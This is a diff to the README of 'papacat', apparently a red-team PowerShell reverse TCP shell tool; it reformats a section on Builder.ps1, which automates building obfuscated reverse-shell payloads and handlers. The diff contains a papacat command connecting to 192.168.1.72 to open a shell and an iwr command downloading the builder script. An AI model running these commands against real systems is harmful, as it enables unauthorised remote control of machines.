@@ -100,16 +100,21 @@ papacat -c 192.168.1.72 -ep -p 666 -v
 
 <br /><br />
 
-# Automation - Obfuscation ( @Meterpeter )
+# Automation - Obfuscation
 
-Builder.ps1 cmdlet automates the creation of papacat reverse tcp shell ( payload - handler )
-![https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1)
+<b><i>Builder.ps1</i></b> cmdlet automates the creation of papacat reverse tcp shell ( payload - handler )
+[https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1)
 
 <br />
 
 #### Download cmdlet
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/papacat_rev_shell/Builder.ps1" -OutFile "Builder.ps1"
+```
+
+#### cmdlet help
+```powershell
+Get-Help .\Builder.ps1 -full
 ```
 
 <br /><br />
